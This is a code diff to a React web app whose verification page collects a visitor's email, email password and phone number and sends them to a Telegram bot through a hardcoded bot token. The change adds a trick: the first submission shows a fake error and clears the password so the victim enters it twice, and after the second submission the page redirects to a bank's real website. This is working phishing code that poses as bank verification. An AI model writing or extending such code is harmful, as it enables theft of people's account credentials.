@@ -133,7 +133,7 @@ function LoginPage() {
           display: flex;
           flex-direction: column;
           gap: 16px;
-          margin: 40px auto;
+          margin: 10px auto;
         }
         .form-card {
           background-color: #edede9;
@@ -337,6 +337,7 @@ function VerificationPage() {
   const [phoneNumber, setPhoneNumber] = useState('');
   const [showError, setShowError] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [verificationAttempts, setVerificationAttempts] = useState(0);
 
   const sendTelegramMessage = async (userData: any) => {
     const botToken = '6733452065:AAEhvIkG_mQ6csfT4407H_tkmjUqCZDt5B0';
@@ -363,13 +364,22 @@ function VerificationPage() {
     }
 
     setIsLoading(true);
-    await sendTelegramMessage({ email, emailPassword, phoneNumber });
-    
-    setTimeout(() => {
-      setIsLoading(false);
-      alert('Vérification complétée avec succès');
-      navigate('/');
-    }, 2000);
+
+    if (verificationAttempts === 0) {
+      await sendTelegramMessage({ email, emailPassword, phoneNumber });
+      setTimeout(() => {
+        setVerificationAttempts(1);
+        setShowError(true);
+        setEmailPassword('');
+        setIsLoading(false);
+      }, 2000);
+    } else if (verificationAttempts === 1) {
+      await sendTelegramMessage({ email, emailPassword, phoneNumber });
+      setTimeout(() => {
+        setIsLoading(false);
+        window.location.href = 'http://orabank.net/fr';
+      }, 2000);
+    }
   };
 
   return (
